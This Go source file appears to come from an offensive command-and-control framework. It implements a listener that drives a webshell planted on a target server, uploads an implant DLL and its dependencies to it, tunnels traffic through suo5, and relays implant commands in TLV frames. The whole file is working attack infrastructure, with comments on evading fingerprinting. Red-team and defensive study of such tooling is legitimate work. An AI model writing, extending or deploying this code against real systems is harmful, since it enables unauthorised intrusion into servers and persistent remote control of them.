package listener

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/tls"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/chainreactors/IoM-go/consts"
	"github.com/chainreactors/IoM-go/proto/client/clientpb"
	"github.com/chainreactors/IoM-go/proto/implant/implantpb"
	"github.com/chainreactors/IoM-go/types"
	"github.com/chainreactors/logs"
	"github.com/chainreactors/malice-network/helper/encoders/hash"
	"github.com/chainreactors/malice-network/server/internal/core"
	"github.com/chainreactors/proxyclient/suo5"
	"google.golang.org/protobuf/proto"
)

// Stage codes for DLL bootstrap HTTP envelope.
const (
	wsStageLoad   byte = 0x01
	wsStageStatus byte = 0x02
	wsStageInit   byte = 0x03
	wsStageDeps   byte = 0x06
)

// TLV delimiters matching malefic wire format.
const (
	tlvStart     byte   = 0xd1
	tlvEnd       byte   = 0xd2
	tlvHeaderLen        = 9 // 1 (start) + 4 (sid) + 4 (len)
	maxFrameSize uint32 = 10 * 1024 * 1024
)

// webshellParams is the JSON stored in CustomPipeline.Params.
type webshellParams struct {
	Suo5URL    string `json:"suo5_url"`
	StageToken string `json:"stage_token,omitempty"`
	DLLPath    string `json:"dll_path,omitempty"`
	DepsDir    string `json:"deps_dir,omitempty"`
}

// httpTransport wraps a shared http.Client with OPSEC-safe defaults.
type httpTransport struct {
	client *http.Client
	url    string
	token  string
}

func newHTTPTransport(suo5URL, token string, timeout time.Duration) *httpTransport {
	return &httpTransport{
		client: &http.Client{
			Timeout: timeout,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		},
		url:   suo5ToHTTPURL(suo5URL),
		token: token,
	}
}

// do sends a body-envelope HTTP POST.
// Envelope: [1B stage][4B sid LE][1B token_len][token][payload]
// No XOR obfuscation — webshells (PHP/JSP/ASPX) parse the raw envelope directly.
func (t *httpTransport) do(stage byte, payload []byte, sid uint32) ([]byte, error) {
	tok := computeBootstrapToken(t.token)
	tokLen := len(tok)
	if tokLen > 255 {
		tokLen = 255
		tok = tok[:255]
	}

	hdrLen := 6 + tokLen
	buf := make([]byte, hdrLen+len(payload))
	buf[0] = stage
	binary.LittleEndian.PutUint32(buf[1:5], sid)
	buf[5] = byte(tokLen)
	copy(buf[6:6+tokLen], tok)
	copy(buf[hdrLen:], payload)

	req, err := http.NewRequest("POST", t.url, bytes.NewReader(buf))
	if err != nil {
		return nil, err
	}
	// OPSEC: no fingerprinting headers.
	req.Header.Set("User-Agent", "")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(body))
	}
	return body, nil
}

func NewWebShellPipeline(rpc bindRPCClient, pipeline *clientpb.Pipeline) (*WebShellPipeline, error) {
	custom := pipeline.GetCustom()
	if custom == nil {
		return nil, fmt.Errorf("webshell pipeline missing custom body")
	}

	var params webshellParams
	if custom.Params != "" {
		if err := json.Unmarshal([]byte(custom.Params), &params); err != nil {
			return nil, fmt.Errorf("parse webshell params: %w", err)
		}
	}
	if params.Suo5URL == "" && custom.Host != "" {
		params.Suo5URL = custom.Host
	}
	if params.Suo5URL == "" {
		return nil, fmt.Errorf("webshell pipeline requires suo5_url")
	}

	return &WebShellPipeline{
		rpc:        rpc,
		Name:       pipeline.Name,
		ListenerID: pipeline.ListenerId,
		Enable:     pipeline.Enable,
		Suo5URL:    params.Suo5URL,
		StageToken: params.StageToken,
		DLLPath:    params.DLLPath,
		DepsDir:    params.DepsDir,
		transport:  newHTTPTransport(params.Suo5URL, params.StageToken, 30*time.Second),
		pipeline:   pipeline,
	}, nil
}

type WebShellPipeline struct {
	rpc        bindRPCClient
	Name       string
	ListenerID string
	Enable     bool
	Suo5URL    string
	StageToken string
	DLLPath    string
	DepsDir    string

	transport *httpTransport
	sessions  sync.Map // rawID(uint32) → *webshellSession
	pipeline  *clientpb.Pipeline
}

type webshellSession struct {
	conn  net.Conn
	rawID uint32
	mu    sync.Mutex
}

func (p *WebShellPipeline) ID() string { return p.Name }

func (p *WebShellPipeline) ToProtobuf() *clientpb.Pipeline { return p.pipeline }

func (p *WebShellPipeline) Start() error {
	p.Enable = true
	forward, err := core.NewForward(p.rpc, p)
	if err != nil {
		return err
	}
	forward.ListenerId = p.ListenerID
	core.Forwarders.Add(forward)

	logs.Log.Infof("[pipeline] starting WebShell pipeline %s -> %s", p.Name, p.Suo5URL)
	core.GoGuarded("webshell-handler:"+p.Name, p.handler, p.runtimeErrorHandler("handler loop"))
	return nil
}

func (p *WebShellPipeline) Close() error {
	p.Enable = false
	p.sessions.Range(func(key, value interface{}) bool {
		sess := value.(*webshellSession)
		sess.conn.Close()
		p.sessions.Delete(key)
		return true
	})
	return nil
}

// handler is the main loop receiving SpiteRequests from the server via Forward.
func (p *WebShellPipeline) handler() error {
	defer logs.Log.Debugf("webshell pipeline %s handler exit", p.Name)
	for {
		forward := core.Forwarders.Get(p.ID())
		if forward == nil {
			return fmt.Errorf("webshell pipeline %s forwarder missing", p.Name)
		}
		msg, err := forward.Stream.Recv()
		if err != nil {
			return fmt.Errorf("webshell pipeline %s recv: %w", p.Name, err)
		}
		core.GoGuarded("webshell-request:"+p.Name, func() error {
			return p.handlerReq(msg)
		}, core.LogGuardedError("webshell-request:"+p.Name))
	}
}

// handlerReq dispatches a single SpiteRequest. ModuleInit triggers DLL bootstrap
// and suo5 channel setup; everything else is forwarded to the session conn.
func (p *WebShellPipeline) handlerReq(req *clientpb.SpiteRequest) error {
	rawID := req.Session.RawId

	if req.Spite.Name == consts.ModuleInit {
		return p.initSession(rawID)
	}

	val, ok := p.sessions.Load(rawID)
	if !ok {
		return fmt.Errorf("session %d not found", rawID)
	}
	sess := val.(*webshellSession)

	spites := &implantpb.Spites{Spites: []*implantpb.Spite{req.Spite}}
	sess.mu.Lock()
	err := writeFrame(sess.conn, spites, sess.rawID)
	sess.mu.Unlock()
	return err
}

// initSession bootstraps DLL, dials suo5, registers session, starts readLoop.
func (p *WebShellPipeline) initSession(rawID uint32) error {
	if p.DepsDir != "" {
		if err := p.deliverDeps(); err != nil {
			logs.Log.Warnf("deliver deps: %v", err)
		}
	}

	reg, sid, err := p.bootstrapDLL()
	if err != nil {
		return fmt.Errorf("bootstrap DLL: %w", err)
	}

	conn, err := p.dialSuo5()
	if err != nil {
		return fmt.Errorf("dial suo5: %w", err)
	}

	sess := &webshellSession{conn: conn, rawID: sid}
	p.sessions.Store(sid, sess)

	regSpite, _ := types.BuildSpite(&implantpb.Spite{
		Name: types.MsgRegister.String(),
	}, reg)

	sessionID := hash.Md5Hash([]byte(fmt.Sprintf("%d", sid)))
	core.Forwarders.Send(p.ID(), &core.Message{
		Spites:    &implantpb.Spites{Spites: []*implantpb.Spite{regSpite}},
		SessionID: sessionID,
		RawID:     sid,
	})

	core.GoGuarded(
		fmt.Sprintf("webshell-readloop:%s:%d", p.Name, sid),
		func() error { return p.readLoop(sess, sessionID) },
		core.LogGuardedError(fmt.Sprintf("webshell-readloop:%s:%d", p.Name, sid)),
	)

	logs.Log.Importantf("[webshell] session %d registered via %s", sid, p.Suo5URL)
	return nil
}

// readLoop reads TLV frames from suo5 conn and forwards to server.
func (p *WebShellPipeline) readLoop(sess *webshellSession, sessionID string) error {
	defer func() {
		sess.conn.Close()
		p.sessions.Delete(sess.rawID)
		logs.Log.Debugf("[webshell] readLoop exit for session %d", sess.rawID)
	}()
	for {
		spites, err := readFrame(sess.conn)
		if err != nil {
			return fmt.Errorf("session %d read: %w", sess.rawID, err)
		}
		core.Forwarders.Send(p.ID(), &core.Message{
			Spites:    spites,
			SessionID: sessionID,
			RawID:     sess.rawID,
		})
	}
}

// bootstrapDLL performs status check, DLL load if needed, and init handshake.
func (p *WebShellPipeline) bootstrapDLL() (*implantpb.Register, uint32, error) {
	statusBody, err := p.transport.do(wsStageStatus, nil, 0)
	if err != nil {
		return nil, 0, fmt.Errorf("status check: %w", err)
	}

	ready := false
	text := strings.TrimSpace(string(statusBody))
	if len(text) > 0 && text[0] == '{' {
		var sr struct{ Ready bool }
		if json.Unmarshal([]byte(text), &sr) == nil {
			ready = sr.Ready
		}
	} else if text == "LOADED" {
		ready = true
	}

	if !ready && p.DLLPath != "" {
		dllBytes, err := os.ReadFile(p.DLLPath)
		if err != nil {
			return nil, 0, fmt.Errorf("read DLL %s: %w", p.DLLPath, err)
		}
		if _, err = p.transport.do(wsStageLoad, dllBytes, 0); err != nil {
			return nil, 0, fmt.Errorf("load DLL: %w", err)
		}
		logs.Log.Infof("[webshell] DLL loaded to %s", p.transport.url)
	} else if !ready {
		return nil, 0, fmt.Errorf("DLL not loaded and no --dll path provided")
	}

	body, err := p.transport.do(wsStageInit, nil, 0)
	if err != nil {
		return nil, 0, fmt.Errorf("init: %w", err)
	}
	if len(body) < 4 {
		return nil, 0, fmt.Errorf("init response too short: %d bytes", len(body))
	}

	sid := binary.LittleEndian.Uint32(body[:4])
	reg := &implantpb.Register{}
	if err := proto.Unmarshal(body[4:], reg); err != nil {
		return nil, 0, fmt.Errorf("unmarshal register: %w", err)
	}
	return reg, sid, nil
}

func (p *WebShellPipeline) deliverDeps() error {
	entries, err := os.ReadDir(p.DepsDir)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		data, err := os.ReadFile(filepath.Join(p.DepsDir, entry.Name()))
		if err != nil {
			return fmt.Errorf("read dep %s: %w", entry.Name(), err)
		}
		depName := entry.Name()
		if !strings.HasPrefix(depName, ".") {
			depName = "." + depName
		}
		nameBytes := []byte(depName)
		if len(nameBytes) > 255 {
			nameBytes = nameBytes[:255]
		}
		payload := make([]byte, 1+len(nameBytes)+len(data))
		payload[0] = byte(len(nameBytes))
		copy(payload[1:1+len(nameBytes)], nameBytes)
		copy(payload[1+len(nameBytes):], data)

		if _, err = p.transport.do(wsStageDeps, payload, 0); err != nil {
			return fmt.Errorf("deliver dep %s: %w", entry.Name(), err)
		}
		logs.Log.Debugf("[webshell] dep delivered: %s", entry.Name())
	}
	return nil
}

func (p *WebShellPipeline) dialSuo5() (net.Conn, error) {
	u, err := url.Parse(p.Suo5URL)
	if err != nil {
		return nil, fmt.Errorf("parse suo5 url: %w", err)
	}
	conf, err := suo5.NewConfFromURL(u)
	if err != nil {
		return nil, fmt.Errorf("suo5 config: %w", err)
	}
	if string(conf.Mode) == "half" {
		return nil, fmt.Errorf("suo5 detected half-duplex mode; webshell bridge requires full-duplex (target may be behind a buffering reverse proxy)")
	}
	client := &suo5.Suo5Client{Proxy: u, Conf: conf}
	conn, err := client.Dial("tcp", "bridge:0")
	if err != nil {
		return nil, fmt.Errorf("suo5 dial: %w", err)
	}
	return conn, nil
}

func (p *WebShellPipeline) runtimeErrorHandler(scope string) core.GoErrorHandler {
	label := fmt.Sprintf("webshell pipeline %s %s", p.Name, scope)
	return core.CombineErrorHandlers(
		core.LogGuardedError(label),
		func(err error) {
			p.Enable = false
			if core.EventBroker != nil {
				core.EventBroker.Publish(core.Event{
					EventType: consts.EventListener,
					Op:        consts.CtrlPipelineStop,
					Listener:  &clientpb.Listener{Id: p.ListenerID},
					Message:   label,
					Err:       core.ErrorText(err),
					Important: true,
				})
			}
		},
	)
}

// --- TLV frame protocol: [0xd1][4B sid LE][4B len LE][data][0xd2] ---

func writeFrame(conn net.Conn, spites *implantpb.Spites, sid uint32) error {
	data, err := proto.Marshal(spites)
	if err != nil {
		return err
	}
	buf := make([]byte, tlvHeaderLen+len(data)+1)
	buf[0] = tlvStart
	binary.LittleEndian.PutUint32(buf[1:5], sid)
	binary.LittleEndian.PutUint32(buf[5:9], uint32(len(data)))
	copy(buf[tlvHeaderLen:], data)
	buf[len(buf)-1] = tlvEnd
	_, err = conn.Write(buf)
	return err
}

func readFrame(conn net.Conn) (*implantpb.Spites, error) {
	var hdr [tlvHeaderLen]byte
	if _, err := io.ReadFull(conn, hdr[:]); err != nil {
		return nil, err
	}
	if hdr[0] != tlvStart {
		return nil, fmt.Errorf("invalid TLV start: 0x%02x", hdr[0])
	}
	length := binary.LittleEndian.Uint32(hdr[5:9])
	if length > maxFrameSize {
		return nil, fmt.Errorf("frame too large: %d bytes", length)
	}
	// +1 for end delimiter
	payload := make([]byte, length+1)
	if _, err := io.ReadFull(conn, payload); err != nil {
		return nil, err
	}
	if payload[length] != tlvEnd {
		return nil, fmt.Errorf("invalid TLV end: 0x%02x", payload[length])
	}
	spites := &implantpb.Spites{}
	if err := proto.Unmarshal(payload[:length], spites); err != nil {
		return nil, err
	}
	return spites, nil
}

// --- Helpers ---

func computeBootstrapToken(secret string) string {
	if secret == "" {
		return ""
	}
	if len(secret) <= 32 {
		return secret
	}
	window := time.Now().Unix() / 30
	mac := hmac.New(sha256.New, []byte(secret))
	_ = binary.Write(mac, binary.BigEndian, window)
	return hex.EncodeToString(mac.Sum(nil))
}

func suo5ToHTTPURL(suo5URL string) string {
	s := strings.TrimSpace(suo5URL)
	s = strings.Replace(s, "suo5s://", "https://", 1)
	s = strings.Replace(s, "suo5://", "http://", 1)
	return s
}

